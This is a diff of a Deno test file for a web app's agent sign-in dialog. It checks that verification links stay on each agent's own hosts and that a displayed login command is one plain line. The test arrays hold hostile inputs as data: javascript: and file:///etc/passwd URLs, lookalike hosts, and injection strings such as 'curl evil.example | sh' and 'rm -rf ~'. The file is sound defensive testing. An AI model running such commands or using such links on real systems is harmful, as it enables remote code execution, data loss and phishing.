@@ -1,4 +1,5 @@
 import { assertEquals } from "@std/assert";
+import type { CodingAgent } from "../../apps/web/src/pages/machine-state.ts";
 import {
   agentNeedingSignIn,
   agentOfBinding,
@@ -13,6 +14,7 @@ import {
   pageBadge,
   parseChallenge,
   paymentKind,
+  safeCommand,
   softwareEntries,
 } from "../../apps/web/src/pages/machine-agents.ts";
 
@@ -214,51 +216,61 @@ Deno.test("the banner is about the first agent that is signed out, else the firs
   assertEquals(agentNeedingSignIn([]), null);
 });
 
-Deno.test("an address is shown only if it is a plain https address; a code only if it is plainly a code", () => {
+Deno.test("an address is shown only if it is a plain https address on the agent's own hosts; a code only if it is plainly a code", () => {
+  const parse = (challenge: unknown, agent: CodingAgent = "claude") =>
+    parseChallenge(challenge, agent);
   assertEquals(
-    parseChallenge({
-      verificationUri: "https://login.example/device",
+    parse({
+      verificationUri: "https://claude.ai/device",
       userCode: "ABCD-EFGH",
     }),
     {
-      address: "https://login.example/device",
+      address: "https://claude.ai/device",
       code: "ABCD-EFGH",
+      codeRejected: false,
     },
   );
   assertEquals(
-    parseChallenge({
-      verification_uri: "https://login.example/d",
+    parse({
+      verification_uri: "https://console.anthropic.com/d",
       user_code: "WXYZ1234",
     }),
-    { address: "https://login.example/d", code: "WXYZ1234" },
+    {
+      address: "https://console.anthropic.com/d",
+      code: "WXYZ1234",
+      codeRejected: false,
+    },
   );
-  assertEquals(parseChallenge({ url: "https://login.example/start" }), {
-    address: "https://login.example/start",
+  assertEquals(parse({ url: "https://claude.com/start" }), {
+    address: "https://claude.com/start",
     code: null,
+    codeRejected: false,
   });
-  assertEquals(parseChallenge("https://login.example/x"), {
-    address: "https://login.example/x",
+  assertEquals(parse("https://claude.ai/x"), {
+    address: "https://claude.ai/x",
     code: null,
+    codeRejected: false,
   });
   for (
     const hostile of [
       "javascript:alert(1)",
-      "http://login.example/",
+      "http://claude.ai/",
       "data:text/html,<script>1</script>",
-      "https://user:pass@login.example/",
+      "https://user:pass@claude.ai/",
       "file:///etc/passwd",
-      "//login.example/",
+      "//claude.ai/",
       "not a url",
       "",
-      `https://login.example/${"a".repeat(2000)}`,
+      `https://claude.ai/${"a".repeat(2000)}`,
+      "https://claude.ai:8443/device",
     ]
   ) {
     assertEquals(
-      parseChallenge({ verificationUri: hostile }).address,
+      parse({ verificationUri: hostile }).address,
       null,
       hostile.slice(0, 30),
     );
-    assertEquals(parseChallenge(hostile).address, null, hostile.slice(0, 30));
+    assertEquals(parse(hostile).address, null, hostile.slice(0, 30));
   }
   for (
     const code of [
@@ -270,33 +282,128 @@ Deno.test("an address is shown only if it is a plain https address; a code only 
       "a\nb",
       "ABCD‏EFGH",
       "ABC;DEF",
+      7,
     ]
   ) {
-    assertEquals(
-      parseChallenge({ userCode: code }).code,
-      null,
-      JSON.stringify(code),
-    );
+    const parsed = parse({ userCode: code });
+    assertEquals(parsed.code, null, JSON.stringify(code));
+    // A code that was given and is not one is rejected, not silently dropped.
+    assertEquals(parsed.codeRejected, true, JSON.stringify(code));
   }
   for (
-    const odd of [null, undefined, 7, true, [], ["https://login.example/"], {
-      nested: { verificationUri: "https://login.example/" },
+    const odd of [null, undefined, 7, true, [], ["https://claude.ai/"], {
+      nested: { verificationUri: "https://claude.ai/" },
     }]
   ) {
     assertEquals(
-      parseChallenge(odd),
-      { address: null, code: null },
+      parse(odd),
+      { address: null, code: null, codeRejected: false },
       JSON.stringify(odd),
     );
   }
+  // A code key that holds nothing is no code given at all.
+  assertEquals(
+    parse({ verificationUri: "https://claude.ai/d", userCode: null }),
+    { address: "https://claude.ai/d", code: null, codeRejected: false },
+  );
   // The first key that is a good address wins; a bad one before it is skipped.
   assertEquals(
-    parseChallenge({
+    parse({
       verificationUri: "javascript:1",
-      url: "https://login.example/ok",
+      url: "https://claude.ai/ok",
     }).address,
-    "https://login.example/ok",
+    "https://claude.ai/ok",
   );
+});
+
+Deno.test("an address must be on one of the agent's own hosts or a subdomain of one: not any https site", () => {
+  const addressOf = (agent: CodingAgent, address: string) =>
+    parseChallenge({ verificationUri: address }, agent).address;
+  // The agent's own hosts and their subdomains.
+  assertEquals(
+    addressOf("claude", "https://claude.ai/login"),
+    "https://claude.ai/login",
+  );
+  assertEquals(
+    addressOf("claude", "https://platform.claude.com/x"),
+    "https://platform.claude.com/x",
+  );
+  assertEquals(
+    addressOf("codex", "https://auth.openai.com/codex/device"),
+    "https://auth.openai.com/codex/device",
+  );
+  // Upper case normalises to the real host.
+  assertEquals(
+    addressOf("claude", "HTTPS://CLAUDE.AI/x"),
+    "https://claude.ai/x",
+  );
+  // Not on the list, or only made to look like it.
+  for (
+    const lookalike of [
+      "https://evil.example/claude-login",
+      "https://login.example/device",
+      "https://claude.ai.evil.example/x",
+      "https://notclaude.ai/x",
+      "https://claude.ai.evil.example/",
+      "https://evilclaude.ai/x",
+      "https://127.0.0.1:8443/device",
+      "https://127.0.0.1/device",
+      "https://[::1]/device",
+      "https://xn--claud-9d0a.ai/x",
+      "https://claude.ai@evil.example/x",
+      "https://evil.example\\@claude.ai/x",
+      "https://claude.ai./x",
+    ]
+  ) {
+    assertEquals(addressOf("claude", lookalike), null, lookalike);
+  }
+  // An agent's host is not another agent's.
+  assertEquals(addressOf("claude", "https://auth.openai.com/x"), null);
+  assertEquals(addressOf("codex", "https://claude.ai/x"), null);
+  // Pi signs in to several providers.
+  assertEquals(
+    addressOf("pi", "https://github.com/login/device"),
+    "https://github.com/login/device",
+  );
+  assertEquals(
+    addressOf("pi", "https://claude.ai/x"),
+    "https://claude.ai/x",
+  );
+  assertEquals(addressOf("pi", "https://evil.example/x"), null);
+});
+
+Deno.test("the command to type on the machine is one plain line, never a second command", () => {
+  for (
+    const good of [
+      "claude login",
+      "agent two login",
+      "agent two login --device-auth",
+      "  pi /login  ",
+      "claude auth login --provider=anthropic",
+    ]
+  ) assertEquals(safeCommand(good), good.trim(), good);
+  for (
+    const bad of [
+      "claude login\nrm -rf ~",
+      "claude login\r\nrm -rf ~",
+      "claude login; ls",
+      "claude login; rm -rf ~",
+      "claude login && curl evil.example | sh",
+      "claude login | tee x",
+      "claude login `id`",
+      "claude login $(id)",
+      "claude login > x",
+      "claude login 'x'",
+      "\u202eclaude login",
+      "<script>",
+      "-rf",
+      "",
+      "   ",
+      "a".repeat(201),
+    ]
+  ) assertEquals(safeCommand(bad), null, JSON.stringify(bad));
+  assertEquals(safeCommand(null), null);
+  assertEquals(safeCommand(undefined), null);
 });
 
 Deno.test("minutes left are whole, at least one, and absent without a usable expiry", () => {
@@ -323,123 +430,181 @@ const attempt = (over: Partial<AttemptFacts> = {}): AttemptFacts => ({
 });
 
 Deno.test("the dialog shows exactly what the server has returned: starting, a code and an address, a link, the machine itself, and each end", () => {
-  assertEquals(dialogView(null, NOW), { kind: "starting" });
-  assertEquals(dialogView(attempt(), NOW), { kind: "starting" });
-  assertEquals(dialogView(attempt({ state: "challenge_issued" }), NOW), {
-    kind: "waiting",
-    minutes: 10,
-  });
+  const view = (
+    attempt: AttemptFacts | null,
+    agent: CodingAgent = "claude",
+  ) => dialogView(attempt, NOW, agent);
+  assertEquals(view(null), { kind: "starting" });
+  assertEquals(view(attempt()), { kind: "starting" });
   assertEquals(
-    dialogView(
+    view(
       attempt({
         state: "challenge_issued",
         challenge: {
-          verificationUri: "https://login.example/d",
+          verificationUri: "https://claude.ai/d",
           userCode: "ABCD-EFGH",
         },
       }),
-      NOW,
     ),
     {
       kind: "codeAndAddress",
-      address: "https://login.example/d",
+      address: "https://claude.ai/d",
       code: "ABCD-EFGH",
       minutes: 10,
     },
   );
   assertEquals(
-    dialogView(
+    view(
       attempt({
         state: "challenge_issued",
         flow: "remote_browser",
-        challenge: { url: "https://login.example/b" },
+        challenge: { url: "https://claude.ai/b" },
       }),
-      NOW,
     ),
-    { kind: "addressOnly", address: "https://login.example/b", minutes: 10 },
+    { kind: "addressOnly", address: "https://claude.ai/b", minutes: 10 },
   );
-  // A code with no address cannot be acted on: it is not shown, only the wait.
+  // An address on a host that is not the agent's is not an address: with the machine asking for the person, the sign-in cannot go on.
   assertEquals(
-    dialogView(
+    view(
       attempt({
         state: "challenge_issued",
-        challenge: { userCode: "ABCD-EFGH" },
+        challenge: { url: "https://evil.example/claude-login" },
       }),
-      NOW,
     ),
-    { kind: "waiting", minutes: 10 },
+    { kind: "unusable" },
   );
-  // A challenge that is not a plain address is not an address.
+  // Nothing an agent's own page could be taken from: the same.
+  for (
+    const challenge of [
+      null,
+      "javascript:1",
+      7,
+      [],
+      { userCode: "ABCD-EFGH" },
+      { verificationUri: "http://claude.ai/d", userCode: "ABCD" },
+      { verificationUri: "https://user:pw@claude.ai/d" },
+    ]
+  ) {
+    assertEquals(
+      view(attempt({ state: "challenge_issued", challenge })),
+      { kind: "unusable" },
+      JSON.stringify(challenge),
+    );
+  }
+  // A code that was given and is not one, beside a good address: unusable, in any state.
+  for (const state of ["pending", "challenge_issued"]) {
+    assertEquals(
+      view(
+        attempt({
+          state,
+          challenge: {
+            verificationUri: "https://claude.ai/d",
+            userCode: "<script>",
+          },
+        }),
+      ),
+      { kind: "unusable" },
+      state,
+    );
+  }
+  // Still starting: a challenge not yet usable is only waited for.
   assertEquals(
-    dialogView(
+    view(
+      attempt({
+        state: "pending",
+        challenge: { url: "https://evil.example/x" },
+      }),
+    ),
+    { kind: "starting" },
+  );
+  // The agent decides the hosts.
+  assertEquals(
+    view(
       attempt({
         state: "challenge_issued",
-        challenge: { verificationUri: "javascript:1", userCode: "ABCD" },
+        challenge: { url: "https://claude.ai/b" },
       }),
-      NOW,
+      "codex",
     ),
-    { kind: "waiting", minutes: 10 },
+    { kind: "unusable" },
   );
-  // The machine itself: the command only when the server gives one.
+  // The machine itself: the command only when the server gives one and it is one plain line.
   assertEquals(
-    dialogView(
+    view(
       attempt({
         state: "terminal",
         flow: "terminal",
         instructions: "claude login",
       }),
-      NOW,
     ),
     { kind: "onMachine", command: "claude login" },
   );
   assertEquals(
-    dialogView(
-      attempt({ state: "terminal", flow: "terminal", instructions: "  " }),
-      NOW,
-    ),
+    view(attempt({ state: "terminal", flow: "terminal", instructions: "  " })),
     { kind: "onMachine", command: null },
   );
   assertEquals(
-    dialogView(
+    view(
       attempt({ state: "terminal", flow: "terminal", instructions: null }),
-      NOW,
     ),
     { kind: "onMachine", command: null },
   );
   assertEquals(
-    dialogView(
+    view(
+      attempt({
+        state: "terminal",
+        flow: "terminal",
+        instructions: "claude login\nrm -rf ~",
+      }),
+    ),
+    { kind: "onMachine", command: null },
+  );
+  assertEquals(
+    view(
       attempt({
         state: "pending",
         flow: "terminal",
         instructions: "agent two login",
       }),
-      NOW,
     ),
     { kind: "onMachine", command: "agent two login" },
   );
+  // The flow alone says the local handoff too, and its command is held to the same rule.
+  assertEquals(
+    view(
+      attempt({
+        state: "pending",
+        flow: "terminal",
+        instructions: "agent two login\nrm -rf ~",
+      }),
+    ),
+    { kind: "onMachine", command: null },
+  );
   // The state alone says the local handoff, whatever flow the server names.
   assertEquals(
-    dialogView(
+    view(
       attempt({
         state: "terminal",
         flow: "remote_device",
         instructions: "pi login",
       }),
-      NOW,
     ),
     { kind: "onMachine", command: "pi login" },
   );
   assertEquals(
-    dialogView(
-      attempt({ state: "terminal", flow: null, instructions: null }),
-      NOW,
-    ),
+    view(attempt({ state: "terminal", flow: null, instructions: null })),
     { kind: "onMachine", command: null },
   );
   // No expiry given: no sentence about one.
   assertEquals(
-    dialogView(attempt({ state: "challenge_issued", expiresAt: null }), NOW),
-    { kind: "waiting", minutes: null },
+    view(
+      attempt({
+        state: "challenge_issued",
+        expiresAt: null,
+        challenge: { url: "https://claude.ai/b" },
+      }),
+    ),
+    { kind: "addressOnly", address: "https://claude.ai/b", minutes: null },
   );
   for (
     const [state, kind] of [["completed", "completed"], ["failed", "failed"], [
@@ -448,10 +613,7 @@ Deno.test("the dialog shows exactly what the server has returned: starting, a co
     ], ["canceled", "canceled"]] as const
   ) {
     assertEquals(
-      dialogView(
-        attempt({ state, challenge: { url: "https://login.example/b" } }),
-        NOW,
-      ),
+      view(attempt({ state, challenge: { url: "https://claude.ai/b" } })),
       { kind },
       state,
     );
